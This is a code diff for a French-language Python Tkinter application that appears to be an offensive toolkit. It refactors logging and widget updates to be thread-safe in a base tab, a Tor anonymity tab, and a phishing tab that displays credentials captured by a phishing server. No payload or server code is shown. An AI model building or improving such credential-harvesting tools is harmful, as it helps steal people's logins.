@@ -303,11 +303,20 @@ class BaseTab:
         self.app = app
 
     def log(self, widget, msg, tag=None):
-        widget.insert(tk.END, msg + "\n", tag)
-        widget.see(tk.END)
+        self.app.after(0, lambda: self._do_log(widget, msg, tag))
+
+    def _do_log(self, widget, msg, tag=None):
+        try:
+            widget.insert(tk.END, msg + "\n", tag)
+            widget.see(tk.END)
+        except tk.TclError:
+            pass
 
     def clear(self, widget):
-        widget.delete("1.0", tk.END)
+        try:
+            widget.delete("1.0", tk.END)
+        except tk.TclError:
+            pass
 
     def run_thread(self, target):
         t = threading.Thread(target=target, daemon=True)
@@ -1499,6 +1508,9 @@ class AnonymityTab(BaseTab):
         self.log(self.output, "Changement d'identit\u00e9 Tor...", "bold")
         success, msg = self.app.tor.new_identity()
         self.log(self.output, msg, "success" if success else "error")
+        self.app.after(0, lambda: self._update_after_newid(success))
+
+    def _update_after_newid(self, success):
         if success:
             self.lbl_ip.config(text=f"IP: {self.app.tor.current_ip}")
         else:
@@ -1514,7 +1526,7 @@ class AnonymityTab(BaseTab):
             r = self.app.session.get("https://api.ipify.org?format=json", timeout=8)
             ip = r.json().get("ip", "Inconnu")
             self.log(self.output, f"  IP actuelle: {ip}", "success")
-            self.lbl_ip.config(text=f"IP: {ip}")
+            self.app.after(0, lambda: self.lbl_ip.config(text=f"IP: {ip}"))
             try:
                 r2 = self.app.session.get(f"http://ip-api.com/json/{ip}", timeout=8)
                 data = r2.json()
@@ -1525,7 +1537,7 @@ class AnonymityTab(BaseTab):
                 pass
         except Exception as e:
             self.log(self.output, f"  Erreur: {e}", "error")
-        self.app.update_tor_status()
+        self.app.after(0, self.app.update_tor_status)
 
     # ── Stealth ──
     def toggle_stealth(self):
@@ -2675,19 +2687,22 @@ class PhishingTab(BaseTab):
                 for item in srv.get_captured():
                     if item not in seen:
                         seen.add(item)
-                        parts = item.split("&")
-                        self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Nouveau!\n", "cred")
-                        for p in parts:
-                            if "=" in p:
-                                k, v = p.split("=", 1)
-                                from urllib.parse import unquote
-                                v = unquote(v)
-                                self.log_text.insert(tk.END, f"  {k}: {v}\n", "cred")
-                        self.log_text.insert(tk.END, "-" * 50 + "\n")
-                        self.log_text.see(tk.END)
-                        self.log(self.output, f"Identifiants captur\u00e9s !", "success")
+                        self.app.after(0, lambda i=item: self._display_captured(i))
             except:
                 break
+
+    def _display_captured(self, item):
+        from urllib.parse import unquote
+        parts = item.split("&")
+        self.log_text.insert(tk.END, f"[{datetime.now().strftime('%H:%M:%S')}] Nouveau!\n", "cred")
+        for p in parts:
+            if "=" in p:
+                k, v = p.split("=", 1)
+                v = unquote(v)
+                self.log_text.insert(tk.END, f"  {k}: {v}\n", "cred")
+        self.log_text.insert(tk.END, "-" * 50 + "\n")
+        self.log_text.see(tk.END)
+        self.log(self.output, "Identifiants captur\u00e9s !", "success")
 
     def _get_local_ip(self):
         try:
